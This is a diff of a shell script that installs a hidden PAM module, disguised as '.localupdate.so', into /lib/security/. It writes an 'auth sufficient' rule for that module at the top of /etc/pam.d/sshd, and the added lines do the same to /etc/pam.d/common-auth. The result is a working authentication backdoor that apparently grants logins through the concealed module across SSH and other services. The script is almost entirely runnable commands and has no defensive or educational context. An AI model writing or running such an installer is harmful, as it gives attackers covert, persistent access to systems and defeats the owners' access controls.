@@ -19,11 +19,21 @@ sudo mv .localupdate.so /lib/security/
 
 echo "[*] Patching /etc/pam.d/sshd..."
 PAM_FILE="/etc/pam.d/sshd"
+COMM_AUTH_FILE="/etc/pam.d/common-auth"
+
 LINE="auth sufficient .localupdate.so"
 
 
 if ! grep -Fxq "$LINE" "$PAM_FILE"; then
     sudo sed -i "1i$LINE" "$PAM_FILE"
+    echo "[+] PAM config patched."
+else
+    echo "[=] PAM already patched."
+fi
+
+
+if ! grep -Fxq "$LINE" "$COMM_AUTH_FILE"; then
+    sudo sed -i "1i$LINE" "$COMM_AUTH_FILE"
     echo "[+] PAM config patched."
 else
     echo "[=] PAM already patched."
